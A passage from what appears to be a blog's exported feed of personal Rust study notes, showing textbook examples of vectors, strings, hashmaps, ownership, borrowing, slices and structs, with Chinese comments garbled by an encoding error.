class="literal">T</span>&gt;.</span><br><span class="line">        Some(third) =&gt; println!(<span class="string">"The third element is &#123;&#125;"</span>, third),</span><br><span class="line">        None =&gt; println!(<span class="string">"There is no third element."</span>),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut v = vec![<span class="number">100</span>, <span class="number">32</span>, <span class="number">57</span>];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> &amp;mut v &#123;</span><br><span class="line">        *i += <span class="number">50</span>; //è§£å¼•ç”¨ dereference operator (*) to get to the value <span class="keyword">in</span> i</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum SpreadsheetCell &#123;</span><br><span class="line">        Int(i32),</span><br><span class="line">        Float(f64),</span><br><span class="line">        Text(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let row = vec![  //vecç±»å‹ä¸ºSpreadsheetCell å®é™…ä¸Šå­˜å‚¨ä¸åŒç±»å‹å€¼</span><br><span class="line">        SpreadsheetCell::Int(<span class="number">3</span>),</span><br><span class="line">        SpreadsheetCell::Text(String::from(<span class="string">"blue"</span>)),</span><br><span class="line">        SpreadsheetCell::Float(<span class="number">10.12</span>),</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æšä¸¾è¦é…åˆmatchä½¿ç”¨</p><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>Remember that<code>strings are UTF-8</code>encoded,<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let hello = String::from(<span class="string">"Ø§Ù„Ø³Ù„Ø§Ù… Ø¹Ù„ÙŠÙƒÙ…"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"DobrÃ½ den"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"Hello"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"×©Ö¸××œ×•Ö¹×"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"à¤¨à¤®à¤¸à¥à¤¤à¥‡"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"ã“ã‚“ã«ã¡ã¯"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"ì•ˆë…•í•˜ì„¸ìš”"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"ä½ å¥½"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"OlÃ¡"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"Ğ—Ğ´Ñ€Ğ°Ğ²ÑÑ‚Ğ²ÑƒĞ¹Ñ‚Ğµ"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"Hola"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">"foo"</span>);</span><br><span class="line">    s.push_str(<span class="string">"bar"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">"lo"</span>);</span><br><span class="line">    s.push(<span class="string">'l'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>push method takes<code>a single character</code></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s1 = String::from(<span class="string">"Hello, "</span>);</span><br><span class="line">    let s2 = String::from(<span class="string">"world!"</span>);</span><br><span class="line">    let s3 = s1 + &amp;s2; // note s1 has been moved here and can no longer be used//be moved into the add call and no longer be valid after that.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> add is that the compiler can coerce the &amp;String argument into a &amp;str</p><h4 id="format"><a href="#format" class="headerlink" title="format"></a>format</h4><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s1 = String::from(<span class="string">"tic"</span>);</span><br><span class="line">    let s2 = String::from(<span class="string">"tac"</span>);</span><br><span class="line">    let s3 = String::from(<span class="string">"toe"</span>);</span><br><span class="line"></span><br><span class="line">    let s = format!(<span class="string">"&#123;&#125;-&#123;&#125;-&#123;&#125;"</span>, s1, s2, s3); //doesnâ€™t take ownership of any of its parameters.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>utf-8</code>å¯å˜å­—èŠ‚ 1-4å­—èŠ‚ï¼Œæœ‰äº›ä¸€ä¸ªå­—èŠ‚ æœ‰äº›4ä¸ªå­—èŠ‚</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">let hello = <span class="string">"Ğ—Ğ´Ñ€Ğ°Ğ²ÑÑ‚Ğ²ÑƒĞ¹Ñ‚Ğµ"</span>;</span><br><span class="line"></span><br><span class="line">let s = &amp;hello[<span class="number">0.</span><span class="number">.4</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">"à¤¨à¤®à¤¸à¥à¤¤à¥‡"</span>.chars() &#123;</span><br><span class="line">    println!(<span class="string">"&#123;&#125;"</span>, c);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">"à¤¨à¤®à¤¸à¥à¤¤à¥‡"</span>.bytes() &#123; // returns each raw byte,</span><br><span class="line">    println!(<span class="string">"&#123;&#125;"</span>, b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="hashmap"><a href="#hashmap" class="headerlink" title="hashmap"></a>hashmap</h3><p><code>all of the keys</code> must have the<code>same type</code>, and all of the<code>values</code>must have the<code>same type.</code><br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line">    scores.insert(String::from(<span class="string">"Blue"</span>), <span class="number">10</span>);</span><br><span class="line">    scores.insert(String::from(<span class="string">"Yellow"</span>), <span class="number">50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let teams = vec![String::from(<span class="string">"Blue"</span>), String::from(<span class="string">"Yellow"</span>)];</span><br><span class="line">    let initial_scores = vec![<span class="number">10</span>, <span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    let mut scores: HashMap&lt;_, _&gt; =</span><br><span class="line">        teams.into_iter().zip(initial_scores.into_iter()).collect();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>zip</code>method to create a vector of tuples<br><code>collect</code>method to turn that vector of tuples into a hash map,</p><p>For types that implement the <code>Copy trait</code>, like i32, the values<code>are copied into</code> the hash map. For owned values like String, the values will be moved and the hash map will be the <code>owner of those values</code></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line"></span><br><span class="line">    scores.insert(String::from(<span class="string">"Blue"</span>), <span class="number">10</span>);</span><br><span class="line">    scores.insert(String::from(<span class="string">"Yellow"</span>), <span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    let team_name = String::from(<span class="string">"Blue"</span>);</span><br><span class="line">    let score = scores.get(&amp;team_name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Some(&amp;10). The result is wrapped in Some because get returns an Option&lt;&amp;V&gt;<br>no value get will return None.</p><pre><code>for (key, value) in &amp;scores {    println!(&quot;{}: {}&quot;, key, value);}</code></pre><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line">    scores.insert(String::from(<span class="string">"Blue"</span>), <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    scores.entry(String::from(<span class="string">"Yellow"</span>)).or_insert(<span class="number">50</span>);  //entryæ£€æŸ¥å€¼æ˜¯å¦å­˜åœ¨ï¼Œè¿”å›Entryï¼Œ or_insertæ˜¯Entryçš„æ–¹æ³• <span class="keyword">return</span> a mutable reference to the value   æ²¡æœ‰å€¼æ’å…¥</span><br><span class="line">    scores.entry(String::from(<span class="string">"Blue"</span>)).or_insert(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"&#123;:?&#125;"</span>, scores); //&#123;<span class="string">"Yellow"</span>: <span class="number">50</span>, <span class="string">"Blue"</span>: <span class="number">10</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let text = <span class="string">"hello world wonderful world"</span>;</span><br><span class="line"></span><br><span class="line">    let mut map = HashMap::new();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> text.split_whitespace() &#123;</span><br><span class="line">        let count = map.entry(word).or_insert(<span class="number">0</span>); //or_insert method actually returns a mutable reference (&amp;mut V) æ‰€ä»¥å¯ä»¥åŠ <span class="number">1</span></span><br><span class="line">        *count += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"&#123;:?&#125;"</span>, map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> RUST </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RUSTå­¦ä¹ 2</title>
      <link href="/2020/07/29/RUST%E5%AD%A6%E4%B9%A02/"/>
      <url>/2020/07/29/RUST%E5%AD%A6%E4%B9%A02/</url>
      
        <content type="html"><![CDATA[<h3 id="rust"><a href="#rust" class="headerlink" title="rust"></a>rust</h3><p>All data <code>stored on the stack must have a known, fixed size.</code>Data with an unknown size at compile time or a size that might change must be stored on the heap instead.</p><p>Pushing to<code>the stack is faster than allocating on the heap</code> because the allocator never has to search for a place to store new data;<br><a id="more"></a></p><h3 id="Ownership-Rules"><a href="#Ownership-Rules" class="headerlink" title="Ownership Rules"></a>Ownership Rules</h3><p>è§£å†³å †ä¸Šæ•°æ® çš„é—®é¢˜</p><p>Each value in Rust has a variable thatâ€™s called its owner.<br>There can only <code>be one owner at a time.</code><br>When the <code>owner goes out of scope,</code>the value will be dropped. <code>ä»å †ä¸­å›æ”¶</code></p><p>string å­˜åœ¨scopeä¸­</p><p>the concept of copying the pointer, length, and capacity without copying the data probably sounds like making a shallow copy. </p><p>rust<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let s1 = String::from(<span class="string">"hello"</span>);</span><br><span class="line">  <span class="params">|         -- move occurs because `s1` has type `std::string::String`, which does <span class="keyword">not</span> implement the `Copy` trait</span></span><br><span class="line"><span class="params">3 |</span>     let s2 = s1;</span><br><span class="line">  <span class="params">|              -- value moved here</span></span><br></pre></td></tr></table></figure></p><p>s1 æ— æ•ˆ å›æ”¶åªs2</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s1 = String::from(<span class="string">"hello"</span>);</span><br><span class="line">    let s2 = s1.clone();</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"s1 = &#123;&#125;, s2 = &#123;&#125;"</span>, s1, s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="number">5</span></span><br><span class="line">y=x</span><br></pre></td></tr></table></figure><p><code>æ ˆä¸­ä¸ç”¨clone</code><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let s = String::from(<span class="string">"hello"</span>);  <span class="regexp">//</span> s comes into scope</span><br><span class="line"></span><br><span class="line">    takes_ownership(s);             <span class="regexp">//</span> s<span class="string">'s value moves into the function...</span></span><br><span class="line"><span class="string">                                    // ... and so is no longer valid here</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    let x = 5;                      // x comes into scope</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    makes_copy(x);                  // x would move into the function,</span></span><br><span class="line"><span class="string">                                    // but i32 is Copy, so itâ€™s okay to still</span></span><br><span class="line"><span class="string">                                    // use x afterward</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125; // Here, x goes out of scope, then s. But because s'</span>s value was moved, nothing</span><br><span class="line">  /<span class="regexp">/ special happens.</span></span><br></pre></td></tr></table></figure></p><h3 id="References-and-Borrowing"><a href="#References-and-Borrowing" class="headerlink" title="References and Borrowing"></a>References and Borrowing</h3><p>å¼•ç”¨ ä¸æ‹¿æ‰€æœ‰æƒ ä¹Ÿç§°å€Ÿ<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">"hello"</span>);</span><br><span class="line"></span><br><span class="line">    change(&amp;mut s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fn change(<span class="symbol">some_string:</span> &amp;mut String) &#123;</span><br><span class="line">    some_string.push_str(<span class="string">", world"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ä¸€ä¸ªå¯å˜å˜é‡åªèƒ½å¼•ç”¨ä¸€æ¬¡</code><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">"hello"</span>);</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        let r1 = &amp;mut s;</span><br><span class="line">    &#125; /<span class="regexp">/ r1 goes out of scope here, so we can make a new reference with no problems.</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    let r2 = &amp;mut s;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><p>ç”¨èŠ±æ‹¬å·åˆ›å»ºä¸€ä¸ªç©ºé—´ï¼Œæ¥å¼•ç”¨ï¼Œ</p><p> We also cannot have a mutable reference while we have an immutable one.<br><code>å¯å˜å˜é‡æœ‰ä¸å˜å¼•ç”¨åï¼Œä¸èƒ½åˆ›å»ºå¯å˜å¼•ç”¨</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">"hello"</span>);</span><br><span class="line"></span><br><span class="line">    let r1 = &amp;s; <span class="regexp">//</span> no problem</span><br><span class="line">    let r2 = &amp;s; <span class="regexp">//</span> no problem</span><br><span class="line">    println!(<span class="string">"&#123;&#125; and &#123;&#125;"</span>, r1, r2);</span><br><span class="line">    /<span class="regexp">/ r1 and r2 are no longer used after this point</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    let r3 = &amp;mut s; /</span><span class="regexp">/ no problem</span></span><br><span class="line"><span class="regexp">    println!("&#123;&#125;", r3);</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>å¼•ç”¨èŒƒå›´ä»åˆ›å»ºåˆ°æœ€åä¸€æ¬¡ä½¿ç”¨<br>å…³é”®æ˜¯ä¸é‡å </strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let reference_to_nothing = dangle();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn dangle() -&gt; &amp;String &#123; <span class="regexp">//</span> dangle returns a reference to a String</span><br><span class="line"></span><br><span class="line">    let s = String::from(<span class="string">"hello"</span>); <span class="regexp">//</span> s is a new String</span><br><span class="line"></span><br><span class="line">    &amp;s /<span class="regexp">/ we return a reference to the String, s</span></span><br><span class="line"><span class="regexp">&#125; /</span><span class="regexp">/ Here, s goes out of scope, and is dropped. Its memory goes away.</span></span><br><span class="line"><span class="regexp">  /</span><span class="regexp">/ Danger!</span></span><br></pre></td></tr></table></figure><h3 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn first_word(<span class="symbol">s:</span> &amp;String) -&gt; usize &#123;</span><br><span class="line">    let bytes = s.as_bytes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i, &amp;item) <span class="keyword">in</span> bytes.iter().enumerate() &#123;</span><br><span class="line">        <span class="keyword">if</span> item == b<span class="string">' '</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s.len()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>iter</code>is a method that returns each element in a collection<br><code>enumerate</code> wraps the result of iter and returns each element as part of a tuple instead.<br><code>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç´¢å¼•å€¼ï¼Œç¬¬äºŒä¸ªæ˜¯å€¼çš„å¼•ç”¨</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s = String::from(<span class="string">"hello world"</span>);</span><br><span class="line"></span><br><span class="line">    let hello = &amp;s[<span class="number">0</span>..<span class="number">5</span>]; <span class="regexp">//</span><span class="number">0</span>å¯ä»¥çœå»</span><br><span class="line">    let world = &amp;s[<span class="number">6</span>..<span class="number">11</span>]; å­˜<span class="number">6</span>-<span class="number">10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="string-slices"><a href="#string-slices" class="headerlink" title="string slices"></a>string slices</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">let s = String::from(<span class="string">"hello"</span>);</span><br><span class="line"></span><br><span class="line">let len = s.len();</span><br><span class="line"></span><br><span class="line">let slice = &amp;s[<span class="number">3</span>..len];</span><br><span class="line">let slice = &amp;s[<span class="number">3</span>..]; <span class="regexp">//</span>ç›¸åŒ</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The type that signifies â€œstring sliceâ€ is written as &amp;str:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn first_word(<span class="symbol">s:</span> &amp;String) -&gt; &amp;str &#123;</span><br><span class="line">    let bytes = s.as_bytes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i, &amp;item) <span class="keyword">in</span> bytes.iter().enumerate() &#123;</span><br><span class="line">        <span class="keyword">if</span> item == b<span class="string">' '</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;s[<span class="number">0</span>..i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &amp;s[..]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>String Literals Are Slices<br>å›ºå®šå­—ç¬¦ä¸²å°±æ˜¯ä¸€ç§åˆ‡ç‰‡<br>The type of s here is &amp;str<br>itâ€™s a slice pointing to that specific point of the binary</p><p>fn first_word(s: &amp;str) -&gt; &amp;str {<br><code>å¯ä»¥æ¥å—&amp;String å’Œ &amp;str</code> //String å’Œ å­—ç¬¦ä¸² å¦‚â€œhelloâ€</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">let a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">let slice = &amp;a[<span class="number">1</span>..<span class="number">3</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>ç»“æ„ä½“å­—æ®µé‡Œéƒ½æ˜¯å¯å˜çš„<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let user1 = User &#123;</span><br><span class="line">        <span class="symbol">email:</span> String::from(<span class="string">"someone@example.com"</span>),</span><br><span class="line">        <span class="symbol">username:</span> String::from(<span class="string">"someusername123"</span>),</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>é¡ºåºéšä¾¿<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fn build_user(<span class="symbol">email:</span> String, <span class="symbol">username:</span> String) -&gt; User &#123; <span class="regexp">//</span>è¿”å›struct å®ä¾‹</span><br><span class="line">    User &#123;</span><br><span class="line">        <span class="symbol">email:</span> email,</span><br><span class="line">        <span class="symbol">username:</span> username,</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let user1 = build_user(</span><br><span class="line">        